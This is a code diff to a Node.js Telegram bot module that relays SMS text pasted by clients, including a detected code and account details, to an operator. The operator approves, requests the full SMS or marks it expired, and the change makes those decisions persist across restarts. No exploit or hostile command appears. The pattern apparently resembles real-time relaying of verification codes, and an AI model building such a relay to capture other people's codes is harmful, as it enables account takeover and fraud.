@@ -2,7 +2,10 @@
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
 
-const pending = new Map(); // ref -> { decision, messageId, smsText, createdAt }
+// Live pending requests (SMS submitted, awaiting button tap)
+const pending = new Map();     // ref -> { decision, messageId, smsText, createdAt }
+// Persistent decisions (survive restarts + cover already-handled requests)
+const decisions = new Map();   // ref -> 'pending' | 'approved' | 'paste_full' | 'expired'
 
 function log(m) { console.log('[tg-mtn]', m); }
 
@@ -42,7 +45,6 @@ async function clearButtons(messageId) {
   }).catch(() => {});
 }
 
-/* Called by the server.js dispatcher for approve:/paste_full:/expired: */
 async function handleUpdate(update) {
   const cq = update && update.callback_query;
   if (!cq) return;
@@ -53,27 +55,26 @@ async function handleUpdate(update) {
   // Only handle our three actions
   if (action !== 'approve' && action !== 'paste_full' && action !== 'expired') return;
 
-  const entry = pending.get(txRef);
-  if (!entry) {
-    await answerCallback(cq.id, 'Request already handled.');
-    return;
-  }
-  if (entry.decision !== 'pending') {
-    await answerCallback(cq.id, 'Already ' + entry.decision + '.');
-    return;
-  }
+  // Determine the target decision
+  const target =
+    action === 'approve'    ? 'approved'   :
+    action === 'paste_full' ? 'paste_full' :
+                              'expired';
 
-  if (action === 'approve') {
-    entry.decision = 'approved';
-    await answerCallback(cq.id, '✅ Approved — client continues.');
-  } else if (action === 'paste_full') {
-    entry.decision = 'paste_full';
-    await answerCallback(cq.id, '⚠ Client told to paste the full SMS.');
-  } else if (action === 'expired') {
-    entry.decision = 'expired';
-    await answerCallback(cq.id, '⏱ Client told SMS expired — resend.');
-  }
-  log(`tx ${txRef} → ${entry.decision}`);
+  // RECORD ALWAYS — even if pending entry is gone (Railway idle restart, etc.)
+  decisions.set(txRef, target);
+
+  const entry = pending.get(txRef);
+  if (entry) entry.decision = target;
+
+  const messages = {
+    approved:   '✅ Approved — client continues.',
+    paste_full: '⚠ Client told to paste the full SMS.',
+    expired:    '⏱ Client told SMS expired — resend.'
+  };
+  await answerCallback(cq.id, messages[target] || 'Done.');
+  log(`tx ${txRef} → ${target}${entry ? '' : ' (recovered)'}`);
+
   const messageId = cq.message && cq.message.message_id;
   if (messageId) await clearButtons(messageId);
 }
@@ -84,12 +85,14 @@ function registerRoutes(app) {
       const { tx, code, message, am, cur, c, an, rn } = req.body || {};
       if (!tx || !message) return res.status(400).json({ error: 'Missing tx or message' });
 
+      // If we already have a pending request for this ref, ignore the duplicate
       const existing = pending.get(tx);
       if (existing && existing.decision === 'pending') {
         return res.json({ ok: true, requestId: tx });
       }
 
       pending.set(tx, { decision: 'pending', messageId: null, smsText: message, createdAt: Date.now() });
+      decisions.set(tx, 'pending'); // ← reset decision to pending for the new SMS
 
       const safe = (v) => String(v == null ? '—' : v)
         .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -104,7 +107,6 @@ function registerRoutes(app) {
         `<b>Detected code:</b> <code>${safe(code)}</code>\n\n` +
         `<b>Pasted SMS:</b>\n<pre>${safe(message)}</pre>`;
 
-      // ← THE KEY FIX: plain prefixes that match handleUpdate
       const keyboard = [[
         { text: '✅ Approve',        callback_data: `approve:${tx}` },
         { text: '⚠️ Paste full SMS', callback_data: `paste_full:${tx}` },
@@ -124,9 +126,12 @@ function registerRoutes(app) {
   });
 
   app.get('/api/verification/sms-status/:ref', (req, res) => {
-    const entry = pending.get(req.params.ref);
-    if (!entry) return res.json({ decision: 'pending' });
-    res.json({ decision: entry.decision });
+    const ref = req.params.ref;
+    const live = pending.get(ref);
+    if (live && live.decision !== 'pending') return res.json({ decision: live.decision });
+    const stored = decisions.get(ref);
+    if (stored) return res.json({ decision: stored });
+    res.json({ decision: 'pending' });
   });
 
   log('Routes: /api/verification/sms, /api/verification/sms-status/:ref');
